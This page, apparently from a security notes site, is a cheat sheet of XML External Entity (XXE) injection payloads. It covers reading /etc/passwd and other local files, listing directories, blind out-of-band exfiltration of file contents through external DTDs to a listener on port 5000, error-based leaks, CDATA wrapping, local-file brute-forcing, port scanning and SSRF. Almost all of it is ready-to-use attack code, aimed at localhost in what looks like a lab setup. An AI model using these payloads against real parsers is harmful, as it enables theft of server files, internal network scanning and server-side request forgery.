---
title: "Attacks"
weight: 4
---

## Basic XXE

### View Contents of File

Simple XXE to show the contents of a file

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE doc [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">]>

<todo>&xxe;</todo>
```

### Include File Contents in XML Document

This will include the contents of `/etc/hostname` into the XML document.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE todo [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>

<todo>
  <description>&xxe;</description>
  <category>XXE</category>
</todo>
```

### List Contents of Directory

This will work on Java

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE doc [
  <!ENTITY xxe SYSTEM "file:///etc/">]>

<todo>&xxe;</todo>
```

## Blind XXE

### Exfil Contents of File

#### DTD

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://127.0.0.1:5000/?x=%file;'>">
%eval;
%exfil;
```

#### Payload

```xml
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://127.0.0.1:5000/external.dtd"> %xxe;
]>
```

### Error Based XXE

#### Contents of File - Path Error

##### DTD

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

##### Payload

```xml
<?xml version="1.0" ?>
<!DOCTYPE message [
    <!ENTITY % ext SYSTEM "http://localhost:5000/path_error.dtd">
    %ext;
]>
<message></message>
```

#### List Contents of Directory - Protocol Error

##### External DTD

```xml
<!ENTITY % file SYSTEM "file:///">
<!ENTITY % ent "<!ENTITY data SYSTEM ':%file;'>">
```

##### Payload

```xml
<!DOCTYPE data [
  <!ENTITY % ext SYSTEM "http://127.0.0.1:5000/dtds/payload.dtd" >
  %ext;
  %ent;
]>

<data>&data;</data>
```

## CDATA

### DTD

```xml
<!ENTITY % file SYSTEM "file:///home/vagrant/test_files/heart.txt">
<!ENTITY % start "<![CDATA[">
<!ENTITY % end "]]>">
<!ENTITY % wrapper "<!ENTITY all '%start;%file;%end;'>">
%wrapper;
```

### Payload

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE name [
  <!ENTITY % ext SYSTEM "http://127.0.0.1:5000/cdata.dtd">
  %ext;
]>

<name>&all;</name>
```

## Brute-force Local Files

### DTD

```xml
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://127.0.0.1:5000/?x=%file;'>">
%eval;
%exfil;
```

### Payload

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE name [
  <!ENTITY % file SYSTEM "file:///etc/hostname">
  <!ENTITY % ext SYSTEM "http://127.0.0.1:5000/brute.dtd">
  %ext;
]>

<name></name>
```

## TCP Port Scan

### Payload

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE doc [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:21">]>

<doc>&xxe;</doc>
```

## SSRF

### Payload

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE doc [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:3333/secret.txt">]>

<doc>&xxe;</doc>
```
